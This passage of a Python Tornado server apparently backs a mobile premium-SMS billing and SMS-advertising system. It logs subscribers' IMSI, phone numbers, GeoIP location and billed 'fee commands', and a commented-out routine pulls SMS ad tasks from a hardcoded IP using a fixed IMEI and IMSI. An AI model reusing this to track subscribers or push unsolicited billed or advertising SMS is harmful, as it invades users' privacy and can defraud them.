        reader = geoip2.database.Reader(
            config.GLOBAL_SETTINGS['geoip2_db_file_path'])
        response = reader.city(_reqInfo["ip"])
        _dbLog = poolLog.connection()
        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`,`para08`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)'
        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 1, _reqInfo["imsi"], _reqInfo[
            "ip"], response.subdivisions.most_specific.name, response.city.name, _reqInfo["custCode"], _reqInfo["proCode"], _reqInfo['rspContent'], _reqInfo['svn']])
        _dbLog.close()
        return


class insert_fee_cmd_log(Greenlet):

    def __init__(self, _user, _fee_cmd, _cmd_info):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._user = _user
        self._fee_cmd = _fee_cmd
        self._cmd_info = _cmd_info

    def run(self):
        self.insertFeeCmdLog(self._user, self._fee_cmd, self._cmd_info)
        # gMongoCli.sms.ivrs.insert(arg)

    def insertFeeCmdLog(self, _user, _fee_cmd, _cmd_info):
        _dbLog = poolLog.connection()
        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`,`para05`,`para06`,`para07`) values (%s,%s,%s,%s,%s,%s,%s,%s,%s)'
        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 + random.randint(0, 9999), 201,
                                       _user["imsi"], _fee_cmd["id"], _fee_cmd["spNumber"], _fee_cmd["msg"], _user["mobile"], _cmd_info, _user["province"]])
        _dbLog.close()
        return


class insert_register_cmd_log(Greenlet):

    def __init__(self, _user, _cmd_info):
        # super(greenlet, self).__init__()
        Greenlet.__init__(self)
        self._user = _user
        self._cmd_info = _cmd_info

    def run(self):
        self.insertRegisterCmdLog(self._user, self._cmd_info)

    def insertRegisterCmdLog(self, _user, _cmd_info):
        _dbLog = poolLog.connection()
        _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`,`para04`) values (%s,%s,%s,%s,%s,%s)'
        _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
                                       random.randint(0, 9999), 202, _user["imsi"], _user["mobile"], _cmd_info, _user['province']])
        _dbLog.close()
        return


def get_system_parameter_from_db(_title):
    return systemConfigs[_title]


def cache_parameter():
    global ivrConfigs
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT * FROM `system_configs` '
    _cur.execute(_sql)
    _recordRsp = _cur.fetchall()
    for _t in _recordRsp:
        systemConfigs[_t['title']] = _t['detail']
    tmpIvrConigs = {}
    _sql = "SELECT *,ifnull(closeCity,'') as closeCity,ifnull(freeTimeKeys,'') as freeTimeKeys,ifnull(filter,'') as filter  FROM `ivr_configs` "
    _cur.execute(_sql)
    _recordRsp = _cur.fetchall()
    for _t in _recordRsp:
        tmpIvrConigs[_t['id']] = _t
    ivrConfigs = tmpIvrConigs
    _sql = 'SELECT * FROM `register_targets` '
    _cur.execute(_sql)
    _recordRsp = _cur.fetchall()
    for _t in _recordRsp:
        registerTargetConfigs[_t['apid']] = _t
    _cur.close()
    _dbConfig.close()
    return


# def fetch_sms_ads():
#     if isSmsAdOpenHour():
#         _dbConfig = poolConfig.connection()
#         _cur = _dbConfig.cursor()
#         _sql = 'SELECT count(*) as tot FROM `wait_send_ads` '
#         _cur.execute(_sql)
#         _recordRsp = _cur.fetchone()
#         ctime = int(time.time())
#         imei = '1501660031'
#         imsi = '460029154625815'
#         if _recordRsp != None and systemConfigs['sendSmsAdFetch'] == 'open' and int(_recordRsp['tot']) <= int(systemConfigs['sendSmsAdLessNum']):
#             url = 'http://218.17.211.49:6068/ido/get.php'
#             _r = requests.get(url, params={
#                 'cid': '10354', 'imei': imei, 'imsi': imsi, 'sdk': '21', 'sim': '5', 'info': 'LenovoLenovoA708t'})
#             data = _r.json()
#             text = _r.text
#             print(_r.url)
#             print(text)
#             insertBulk = []
#             if 'tasks' in data.keys():
#                 for _cell in data['tasks']:
#                     insertBulk.append(
#                         (str(_cell['phone']), _cell['msg'], imei, str(_cell), imei, imsi, _cell['msgid'],  _cell['taskid']))
#                 _sql = 'insert into wait_send_ads (targetMobile,msg,createTime,oriContent,oriImei,oriImsi,oriMsgId,oriTaskId) values (%s,%s,%s,%s,%s,%s,%s,%s)'
#                 _dbConfig.cursor().executemany(_sql, insertBulk)
#             threading.Thread(
#                 target=log_fetch_sms_ads(data, _r.url, _r.text))
#         _cur.close()
#         _dbConfig.close()
#     return


def log_fetch_sms_ads(data, url, resp):
    _dbLog = poolLog.connection()
    _sql = 'insert into log_async_generals (`id`,`logId`,`para01`,`para02`,`para03`) values (%s,%s,%s,%s,%s)'
    _dbLog.cursor().execute(_sql, [long(round(time.time() * 1000)) * 10000 +
                                   random.randint(0, 9999), 401, url, str(data), resp])
    _dbLog.close()
    return


def make_app():
    return tornado.web.Application([
        (r"/", MainHandler),
        (r"/tcd/", MainHandler),
        (r"/match/", MatchHandler),
        (r"/test/", TestHandler),
    ])


def get_test_response(_imsi_info):
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
    _cur.execute(_sql, [_imsi_info['imsi'], _imsi_info['testStatus']])
    _recordRsp = _cur.fetchone()
    if _recordRsp == None:
        _sql = 'SELECT response FROM test_responses WHERE imsi = %s and testStatus=%s'
        _cur.execute(_sql, ["def", _imsi_info['testStatus']])
        _recordRsp = _cur.fetchone()
    _cur.close()
    _dbConfig.close()
    return _recordRsp['response'].replace("IMSIimsi", _imsi_info['imsi'])


def check_test_imsi(_imsi):
    # imsi = filter(str.isdigit, _imsi)
    _dbConfig = poolConfig.connection()
    _cur = _dbConfig.cursor()
    _sql = 'SELECT imsi,testStatus,mobile,remark FROM test_imsis WHERE imsi = %s'
    _cur.execute(_sql, [str(_imsi)])
    _record = _cur.fetchone()
    _cur.close()
    _dbConfig.close()
    return _record

if __name__ == "__main__":
    logger.info("begin... on port:" + str(config.GLOBAL_SETTINGS['port']))
    app = make_app()
    app.listen(config.GLOBAL_SETTINGS['port'], xheaders=True)
    cache_parameter()
    # fetch_sms_ads()
    tornado.ioloop.PeriodicCallback(cache_parameter, 6000).start()
    # tornado.ioloop.PeriodicCallback(fetch_sms_ads, 6000).start()
    tornado.ioloop.IOLoop.current().start()
